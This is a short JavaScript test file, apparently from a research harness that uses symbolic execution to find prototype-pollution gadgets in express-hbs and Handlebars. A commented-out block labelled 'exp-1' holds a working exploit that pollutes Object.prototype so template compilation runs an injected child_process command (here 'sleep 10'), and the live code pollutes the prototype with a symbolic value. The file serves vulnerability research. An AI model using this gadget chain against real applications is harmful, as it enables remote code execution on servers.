const hbs = require('express-hbs');

// exp-1
// Object.prototype.type = 'Program';
// Object.prototype.body = [{
//     "type": "MustacheStatement",
//     "path": 0,
//     "params": [{
//         "type": "NumberLiteral",
//         "value": "console.log(process.mainModule.require('child_process').execSync('sleep 10').toString())"
//     }],
//     "loc": {
//         "start": 0,
//         "end": 0
//     }
// }];

// For symbolic execution
var S$ = require('../../../lib/S$');
Object.prototype.type='Program';
Object.prototype.body = S$.pureSymbol('body_undef');


const source = `Hello {{ msg }}`;
const template =  hbs.handlebars.compile(source);

template({msg:"World!"})